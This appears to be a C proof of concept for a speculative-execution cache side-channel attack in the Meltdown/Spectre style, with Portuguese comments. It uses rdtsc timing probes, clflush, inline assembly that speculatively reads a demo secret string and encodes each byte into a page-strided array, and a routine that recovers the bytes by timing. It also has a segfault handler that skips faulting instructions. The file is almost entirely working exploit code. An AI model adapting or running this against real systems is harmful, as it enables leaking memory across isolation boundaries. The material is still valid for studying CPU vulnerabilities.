#define _GNU_SOURCE




#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>

#include <x86intrin.h>
#include <stdlib.h>

#define NUM_ITERACOES 100
#define CACHE_LINE_LEN	128
#define LEN_PAGE	4096
#define TRIAL_TIMES	 1000

#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"
#define KWHT  "\x1B[37m"


static inline void Flush(void *);

int isSegfault=0;
static inline long Probe(void *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%al   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
  return tempo;
}

static inline void Flush(void *addr)
{
	asm __volatile__(
			"mfence		;"
			"clflush 0(%0)	;"
			"mfence		;"
			"lfence		;"
			: : "r" (addr)
			);
}


unsigned Treshold(void *baseSrc)
{

	void* base=baseSrc;
	unsigned i=0;
	unsigned j=0;
	unsigned probe;
	unsigned long long totalComFlush=0;
	unsigned long long totalSemFlush=0;
	//Flush(base);
	while (i<NUM_ITERACOES)
	{
		for (j=0;j<256;j++)
		{
		
		
			probe=Probe(base+j*LEN_PAGE);
			totalComFlush+=probe;
			//printf("com flush %8X\n",probe);
		
			probe=Probe(base+j*LEN_PAGE);
			totalSemFlush+=probe;
			i++;
		
			//printf("sem flush %8X\n",probe);
	
		}
	}
	totalComFlush=totalComFlush/(i);
	totalSemFlush=totalSemFlush/(i);
	printf("media com flush = %08X\n",(unsigned)totalComFlush);
	printf("media sem flush = %08X\n",(unsigned )totalSemFlush);
		

	return (totalComFlush*0.1+totalSemFlush*0.9);

}

static inline int FindSecret(void *baseSrc,unsigned treshold)
{
	void *base=baseSrc;
	unsigned tempo;
	unsigned menort=999999;
	int i=2;
	int isValid=0;
  	unsigned char alvo;	
	while (i<256){
		
		tempo=Probe(base+i*LEN_PAGE);
		//printf("i=%u,tempo=%8x\n",i,tempo);
			if(tempo<menort)
			{
			  	menort=tempo;
		  	  	alvo=i;
				if (tempo<treshold)
				{
		  			isValid=1;
				}
			}
		i++;
	}
	//printf("%c",alvo);
	if (isSegfault)
	{
	
		printf("%s",KRED);	
		isSegfault=0;
	}
	else{
	
		printf("%s",KGRN);
	}

	if (isValid)
	{
	  
	  if (alvo > 'A' && alvo < '}'){
	      printf("%c",alvo);
	  }
	  else{	
	        printf(".");
	  }
	}
	else{
		printf(",");
	}
	printf("%s",KNRM);
	return isValid;


}


void handler(int nSignum, siginfo_t* si, void* vcontext) {
  
  //printf("inorando\n");
  isSegfault=1;
  ucontext_t* context = (ucontext_t*)vcontext;
#ifdef __amd64__
  context->uc_mcontext.gregs[REG_RIP]++;
#else
  context->uc_mcontext.gregs[REG_EIP]++;
#endif
}


int installHandler() {


/*credits to https://gist.github.com/fairlight1337/55978671ace2c75020eddbfbdd670221 */	
  struct sigaction action;
  memset(&action, 0, sizeof(struct sigaction));
  action.sa_flags = SA_SIGINFO;
  action.sa_sigaction = handler;
  sigaction(SIGSEGV, &action, NULL);
  
  int* x = 0;
  int y = *x;
  
  printf("igonring\n");	
  
  return 0;
}

static inline void spec(char *addr , char *base )
{


	//printf("helloo\n");
	char dummy='\0';
	char *vector[200];
	char *fim_offset;
	register char ** startVector;
	register char *ptrAddr;
	int i;
	for (i=0;i<100;i++)
	{
		vector[i]=&dummy;
	}
	for (i=2;i<200;i++)
	{
		vector[i]=addr;
	}
	fim_offset=vector[100];
	startVector=&vector;
	//printf("fim offset: %p\n",fim_offset);
	//printf("vector= %p ,vector0=%p , dummy= %p ,vector100=%p, addr = %p , base=%p\n",vector,vector[0],&dummy,vector[100],addr,base);
	//printf("vector= %p , dummy= %p ,addr = %p\n",vector,&dummy,addr);
	//printf("char * len = %i\n",sizeof(char *))	;
	
	
	startVector=vector;
	ptrAddr=*startVector;
	printf("so far so good\n");
#ifdef __amd64__
		asm __volatile__(
			"nop				\n"
			"nop				\n"
			"nop				\n"
			"start:				\n"
			"mov %0 , %%rax 				\n"
			"mov %1 , %%rbx				\n"
			"xor %%rsi,%%rsi				\n"
			"repeat:				\n"
			"	nop				\n"
			"	nop				\n"
			"	mov (%%rax) , %%rdx 			\n"
			"	.rept 30			\n"
			"	inc %%rsi			\n"
			"	.endr			\n"
			"	nop			\n"
			"	xor %%rcx , %%rcx			\n"
			"	cmp $330, %%rsi			\n"

			"	jz fim			\n"
			"	mov (%%rdx) , %%cl			\n"
			"	shl $12 , %%rcx			\n"
			"	mov (%%rbx,%%rcx,1) , %%cl			\n"
			"	add $8 , %%rax			\n"
			"	jmp repeat				\n"
			"fim:			\n"
			"	nop				\n"
			"	nop			\n"
			://no output
			:"r" (startVector) , "m" (base) , "m" (fim_offset)
			: "rax" , "rbx" , "rcx" , "rdx" , "rsi"
			
			);
	//dummy=*(((unsigned char)vector[101])*4096+base);
	//printf("%c\n",dupmmy);

#else
		asm __volatile__(
			"nop				\n"
			"nop				\n"
			"nop				\n"
			"start:				\n"
			"	mov %0 , %%eax 				\n"
			"	mov %1 , %%ebx				\n"
			"					\n"
			"	xor %%esi,%%esi				\n"
			"repeat:				\n"
			"	nop				\n"
			"	nop				\n"
			"	mov (%%eax) , %%edx 			\n"
			"	xor %%ecx , %%ecx			\n"
			"	.rept 1			\n"
			"	inc %%esi			\n"
			"	.endr			\n"
			"	cmp $90,%%esi			\n"

			"	jz fim			\n"
			"	mov (%%edx) , %%cl			\n"
			"	shl $12 , %%ecx			\n"
			"	mov (%%ebx,%%ecx) , %%cl			\n"
			"	add $4 , %%eax			\n"
			"	jmp repeat				\n"
			"fim:			\n"
			"	nop				\n"
			"	nop			\n"
			://no output
			:"r" (startVector) , "m" (base) , "m" (fim_offset)
			: "eax" , "ebx" , "ecx" , "edx" , "esi" 
			
			);
	//dummy=*(((unsigned char)vector[101])*4096+base);
	
#endif
}
/*
static inline void spec2(char *addr , char *base )
{

	asm __volatile__(
			"				\n"
			"mov %0 , %%rcx				\n"
			"mov %1,%%rbx				\n"
			"nop				\n"
			"				\n"
			"				\n"
			"xor %%rdx,%%rdx				\n"
			".rept 500				\n"
			"add $141,%%rdx				\n"
			"jz stop				\n"
			".endr			\n"
			"				\n"
			"				\n"
			"				\n"
			"xor %%rdx,%%rdx				\n"
			"xor %%rsi,%%rsi				\n"
			".rept 100				\n"
			"add $141,%%rsi				\n"
			"sub $141,%%rsi				\n"
			".endr			\n"
			"				\n"
			"				\n"
			"				\n"
			"				\n"
			"				\n"
			"jz stop				\n"
			"mov (%%rcx),%%dl				\n"
			"shl $12 , %%rdx				\n"
			"mov (%%rbx,%%rdx),%%cl				\n"
			"				\n"
			"				\n"
			"				\n"
			"				\n"
			"				\n"
			"				\n"
			"				\n"
			"stop:				\n"
			"	nop				\n"
			://no output
			: "m"(addr) , "m" (base) 
			: "rax" , "rbx" , "rcx" , "rdx" 
			
			);

}
*/

int main(void)
{
	int fd;
	unsigned long i;
	unsigned treshold;
	void *ptrArray;
	char *ptrArray2;
	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
	printf("segredo= %p\n",segredo);	
	char c;
	//installHandler();


	treshold=Treshold(malloc(LEN_PAGE*257)+LEN_PAGE);
	printf("treshold: %08X\n",treshold);


	for(i=0;i<20 ; i++)
	{
		//for (int j=0 ; j<100 ; j++)
		//{
 			ptrArray2=(char *)malloc(LEN_PAGE*257);//+LEN_PAGE;	
			spec(segredo+i, (char *)ptrArray2);
			asm __volatile__(
					"mfence\n"
					"lfence\n"
					);
			FindSecret(ptrArray2,treshold);
			//free(ptrArray-LEN_PAGE);
		//}
		printf("\n");	
	}
}
















